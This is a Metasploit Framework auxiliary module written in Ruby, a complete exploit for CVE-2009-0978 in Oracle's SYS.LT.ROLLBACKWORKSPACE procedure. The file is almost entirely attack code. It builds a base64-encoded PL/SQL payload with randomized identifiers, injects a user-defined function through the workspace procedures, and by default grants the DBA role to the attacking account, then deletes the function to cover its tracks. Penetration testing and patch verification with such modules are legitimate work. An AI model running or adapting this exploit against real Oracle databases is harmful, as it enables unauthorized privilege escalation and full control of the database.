##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/projects/Framework/
##

require 'msf/core'

class Metasploit3 < Msf::Auxiliary

	include Msf::Exploit::ORACLE

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'SQL Injection via SYS.LT.ROLLBACKWORKSPACE.',
			'Description'    => %q{
				This module exploits an sql injection flaw in the ROLLBACKWORKSPACE
				procedure of the PL/SQL package SYS.LT. Any user with execute
				privilege on the vulnerable package can exploit this vulnerability.
			},
			'Author'         => [ 'MC' ],
			'License'        => MSF_LICENSE,
			'Version'        => '$Revision: 7128 $',
			'References'     =>
				[
					[ 'CVE', '2009-0978' ],
					[ 'URL', 'http://www.oracle.com/technology/deploy/security/critical-patch-updates/cpuapr2009.html' ],
				],
			'DisclosureDate' => 'May 4 2009'))

			register_options( 
				[
					OptString.new('SQL', [ false, 'SQL to execte.',  "GRANT DBA to #{datastore['DBUSER']}"]),					
				], self.class)
	end

	def run
		name  = Rex::Text.rand_text_alpha_upper(rand(10) + 1)
		rand1 = Rex::Text.rand_text_alpha_upper(rand(10) + 1)
		rand2 = Rex::Text.rand_text_alpha_upper(rand(10) + 1)
		rand3 = Rex::Text.rand_text_alpha_upper(rand(10) + 1)
		cruft = Rex::Text.rand_text_alpha_upper(rand(5) + 1)
		
		function = "
			CREATE OR REPLACE FUNCTION #{cruft} 
			RETURN VARCHAR2 AUTHID CURRENT_USER
			AS
			PRAGMA AUTONOMOUS_TRANSACTION;
			BEGIN
			EXECUTE IMMEDIATE '#{datastore['SQL']}';
			COMMIT;
			RETURN '#{cruft}';
			END;"

		package1 = %Q|
			BEGIN 
				SYS.LT.CREATEWORKSPACE('#{name}'' and #{datastore['DBUSER']}.#{cruft}()=''#{cruft}'); 
			END;
			|

		package2 = %Q|
			BEGIN 
				SYS.LT.ROLLBACKWORKSPACE('#{name}'' and #{datastore['DBUSER']}.#{cruft}()=''#{cruft}'); 
			END;
			|

		uno  = Rex::Text.encode_base64(function)
		dos  = Rex::Text.encode_base64(package1)
		tres = Rex::Text.encode_base64(package2)

		sql = %Q|
			DECLARE
			#{rand1} VARCHAR2(32767);
			#{rand2} VARCHAR2(32767);
			#{rand3} VARCHAR2(32767);
			BEGIN
			#{rand1} := utl_raw.cast_to_varchar2(utl_encode.base64_decode(utl_raw.cast_to_raw('#{uno}')));
			EXECUTE IMMEDIATE #{rand1};
			#{rand2} := utl_raw.cast_to_varchar2(utl_encode.base64_decode(utl_raw.cast_to_raw('#{dos}')));
			EXECUTE IMMEDIATE #{rand2};
			#{rand3} := utl_raw.cast_to_varchar2(utl_encode.base64_decode(utl_raw.cast_to_raw('#{tres}')));
			EXECUTE IMMEDIATE #{rand3};
			END;
			|

		clean = "DROP FUNCTION #{cruft}"

		print_status("Attempting sql injection on SYS.LT.ROLLBACKWORKSPACE...")
		begin
			prepare_exec(sql)
		rescue => e
			return
		end

		print_status("Removing function '#{cruft}'...")
		prepare_exec(clean)
	end

end
